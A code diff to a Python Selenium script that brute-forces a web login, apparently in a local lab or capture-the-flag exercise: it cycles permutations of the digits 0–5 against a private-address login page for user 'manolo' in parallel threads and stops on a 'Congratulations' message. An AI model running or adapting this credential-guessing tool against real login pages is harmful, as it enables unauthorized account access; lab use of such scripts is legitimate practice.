@@ -1,8 +1,15 @@
+import os
+import sys
+
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 import itertools, queue, threading
 
+URL = "http://192.168.1.35/"
+CHARS = ["0", "1", "2", "3", "4", "5"]
+USER = "manolo"
+N = 30
 
 def queueTrhead(pb, queue):
     while True:
@@ -40,6 +47,7 @@ class PassBroker:
         html = driver.find_element(By.TAG_NAME, "body").text
         if "Congratulations!!! :-)" in html:
             print("Password found: ",password)
+            os._exit(1)
         driver.close()
 
     def basicBF(self):
@@ -62,11 +70,6 @@ class PassBroker:
                 self.queue.put(permutation)
         self.queue.join()
 
-URL = "http://192.168.1.35/"
-CHARS = ["0", "1", "2", "3", "4", "5"]
-USER = "manolo"
-N = 30
-
 """
 pb = PassBroker(URL, USER, CHARS)
 pb.basicBF()
@@ -74,5 +77,3 @@ pb.basicBF()
 
 pb = PassBroker(URL, USER, CHARS, N)
 pb.parallelizedBF()
-
-#http://pymotw.com/2/Queue/
